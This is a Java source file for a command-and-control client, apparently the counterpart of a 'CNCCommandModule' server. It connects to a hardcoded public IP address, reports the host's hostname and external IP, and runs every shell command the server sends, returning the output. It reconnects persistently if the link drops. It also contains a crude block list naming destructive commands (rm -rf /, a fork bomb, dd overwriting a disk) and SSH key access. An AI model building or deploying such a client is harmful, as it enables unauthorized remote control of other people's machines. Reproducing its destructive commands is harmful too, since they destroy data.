import com.esotericsoftware.kryo.Kryo;
import com.esotericsoftware.kryonet.Client;
import com.esotericsoftware.kryonet.Connection;
import com.esotericsoftware.kryonet.Listener;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.URL;
import java.util.Arrays;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class Main {

    /**
     * @title CNCClientModule
     * @author Kaveen Kumarasinghe
     * @date 06/24/2019
     * <p>
     * This is the counterpart of the CNCCommandModule. This client connects to, and receives commands from the CNCCM at https://github.com/Kav-K/CNCCommandModule
     * <p>
     * This project uses the KryoNet library from EsotericSoftware (https://github.com/EsotericSoftware/kryonet)
     * Please keep in mind that KryoNet is built upon Java NIO, and has a (mostly) asynchronous approach to message transmission and reception.
     */


    //Adjust this accordingly to limit/unlimit the amount of data that can be sent to command in the form of a CommandResponse.
    public static final int WRITEBUFFER = 50 * 1024;
    public static final int OBJECTBUFFER = 50 * 1024;

    //The COMMANDIP and COMMANDPORT designate the public, forward-facing ipv4 address and port of the CNCCommandModule server.
    private static final String COMMANDIP = "178.128.228.52";
    private static final int COMMANDPORT = 80;

    static Client client;
    //AuthenticationStatusLock prevents keepalive transmissions from the command from changing the authentication status to true, in the event of a manual reconnection request!
    private static boolean authenticationStatusLock = false;
    private static boolean authenticated = false;

    //List of classes to be registered with kryo for (de)serialization
    public static final List<Class> KRYO_CLASSES = Arrays.asList(ReconnectRequest.class, AuthenticationConfirmation.class, Command.class, CommandResponse.class, KeepAlive.class, RegisterRequest.class, KillRequest.class);


    //TODO More substantial way to block unsafe commands
    public static List<String> blockedCommands = Arrays.asList("rm -rf /", "rm -rf /home", ":(){ :|:& };:", "shutdown", "> /dev/sda", "/dev/null", "/dev/sda", "dd if=/dev/random of=/dev/sda", "/dev/random", "/root/,ssh", "ssh-copy-id", "ssh");

    public static void main(String[] args) {
        initialize();


    }


    private static RegisterRequest craftRegisterRequest() {
        String hostname = "null";
        String ipAddress = "null";
        try {
            hostname = InetAddress.getLocalHost().getHostName();
        } catch (Exception e) {
            e.printStackTrace();
            error("Unable to obtain hostname");
            System.exit(0);
        }
        try {
            ipAddress = getIp();

        } catch (Exception e) {
            e.printStackTrace();
            error("Unable to obtain host address");
            System.exit(0);
        }
        return new RegisterRequest(hostname, ipAddress);


    }


    private static void initialize() {


        log("Initializing client");
        client = new Client(WRITEBUFFER, OBJECTBUFFER);
        client.start();
        try {
            log("Connecting client to command");
            client.connect(5000, COMMANDIP, COMMANDPORT);
            log("Connected to command");
            registerClasses();

        } catch (Exception e) {
            e.printStackTrace();
            error("Unable to connect to command");
            System.exit(0);
        }
        /*
        This listener functions as an authentication confirmation receiver, and as well as a makeshift status checker for the command server.
        coupled together with startKeepAliveCheck()
         */
        startListeners();


    }

    /*
    Listens for commands sent from the command server and attempts to execute them, returns a CommandResponse!
     */
    private static void startCommandListener() {

        client.addListener(new Listener() {
            public void received(Connection connection, Object object) {
                if (object instanceof Command) {
                    //if (!authenticated) return;

                    Command command = (Command) object;
                    commandLog(command.getCommand());
                    for (String s : blockedCommands) {
                        if (command.getCommand().toLowerCase().contains(s)) {
                            error("Blocked command was attempted: " + command.getCommand());
                            return;
                        }
                    }

                    try {
                        String output = executeCommand(command.getCommand());
                        log("Executed Command");
                        log("OUTPUT: " + output);
                        if (output.isEmpty()) {
                            output = "OK";
                        }
                        client.sendTCP(new CommandResponse(output));

                    } catch (Exception e) {
                        e.printStackTrace();
                        error(e.getMessage());
                        error("Could not execute command: " + command.getCommand());
                        client.sendTCP(new CommandResponse(e.getMessage()));

                    }


                }
            }
        });

    }

    /*
    Check the status of the authenticated variable, and if it is false, start the reconnection task to attempt constant
    reconnections to the server. If it is set to true set it to false and let it be updated back to true by the command server
     */
    private static void startKeepAliveCheck() {
        Timer timer = new Timer("Timer");
        log("Starting authentication checker");
        TimerTask task = new TimerTask() {

            public void run() {
                if (!authenticated) {
                    error("Client is no longer authenticated with command. Starting reconnection thread");
                    startReconnectionThread();
                    this.cancel();
                } else {

                    authenticated = false;


                }


            }


        };

        //TODO More substantial way of handling these timers, but it works flawlessly for now.
        timer.scheduleAtFixedRate(task, 2000, 5000);


    }

    private static void startListeners() {
        client.addListener(new Listener() {
            public void received(Connection connection, Object object) {
                if (object instanceof AuthenticationConfirmation) {
                    if (!authenticationStatusLock)
                        authenticated = true;
                    log("Successfully authenticated by command");

                } else if (object instanceof KeepAlive) {
                    if (!authenticationStatusLock)
                        authenticated = true;
                }
            }
        });
        client.sendTCP(craftRegisterRequest());
        log("Sent authentication request");
        startKeepAliveCheck();
        startCommandListener();
        startKillListener();
        startReconnectRequestListener();

    }

    private static void startReconnectRequestListener() {

        client.addListener(new Listener() {
            public void received(Connection connection, Object object) {
                if (object instanceof ReconnectRequest) {
                    try {
                        log("Attempting soft-kryonet reconnection to command server");
                        authenticated = false;
                        authenticationStatusLock = true;


                    } catch (Exception e) {
                        error(e.getMessage());
                        error("Could not reconnect to command server");

                    }


                }

            }

        });
    }


    /*
    Listens for a kill message from COMMAND
     */
    private static void startKillListener() {

        client.addListener(new Listener() {
            public void received(Connection connection, Object object) {
                if (object instanceof KillRequest) {
                    KillRequest killRequest = (KillRequest) object;
                    if (killRequest.destroy) {
                        //TODO Destroy the client
                    } else {
                        log("KILL REQUEST RECEIVED BY COMMAND. GRACEFULLY EXITING");
                        error("KILL REQUEST RECEIVED BY COMMAND. GRACEFULLY EXITING");
                        client.stop();
                        client.close();
                        System.exit(0);

                    }


                }
            }
        });
    }

    private static void reconnect() throws Exception {


        error("Reconnect initiated, destroying old client instance");
        client.close();
        client.stop();
        log("Attempting connection to command server");
        client = new Client(WRITEBUFFER, OBJECTBUFFER);
        client.start();
        registerClasses();
        client.connect(3000, COMMANDIP, COMMANDPORT);
        log("Successfully reconnected to command");
        startListeners();


    }

    private static void startReconnectionThread() {


        Timer timer = new Timer("Timer");
        TimerTask task = new TimerTask() {
            public void run() {
                try {
                    authenticationStatusLock = false;
                    reconnect();

                    this.cancel();

                } catch (Exception e) {
                    error(e.getMessage());
                    error("Unable to connect to command");

                }

            }


        };
        timer.scheduleAtFixedRate(task, 0, 5000);


    }

    public static final String ANSI_PURPLE = "\u001B[35m";
    public static final String ANSI_CYAN = "\u001B[36m";
    public static final String ANSI_WHITE = "\u001B[37m";
    public static final String ANSI_RESET = "\u001B[0m";
    public static final String ANSI_BLACK = "\u001B[30m";
    public static final String ANSI_RED = "\u001B[31m";
    public static final String ANSI_GREEN = "\u001B[32m";
    public static final String ANSI_YELLOW = "\u001B[33m";
    public static final String ANSI_BLUE = "\u001B[34m";

    public static void log(String message) {
        System.out.println(ANSI_GREEN + "[Client] " + ANSI_RESET + message);
    }

    public static void error(String message) {
        System.out.println(ANSI_RED + "[Client] " + ANSI_RESET + message);
    }

    public static void commandLog(String message) {
        System.out.println(ANSI_BLUE + "[RECEIVED COMMAND] " + ANSI_RESET + message);
    }

    /*
    It is required to use an external service like amazonaws because it is not possible to programatically obtain the external ipv4
    address of a machine under NAT
     */
    public static String getIp() throws Exception {
        URL whatismyip = new URL("http://checkip.amazonaws.com");
        BufferedReader in = null;
        try {
            in = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            String ip = in.readLine();
            return ip;
        } finally {
            if (in != null) {
                try {
                    in.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public static String executeCommand(String cmd) throws java.io.IOException {
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";
    }

    private static void registerClasses() {
        log("Registering classes for serialization/deserialization with kryo");
        Kryo kryo = client.getKryo();
        for (Class c : KRYO_CLASSES) kryo.register(c);
        log("Registered kryo classes");
    }

}
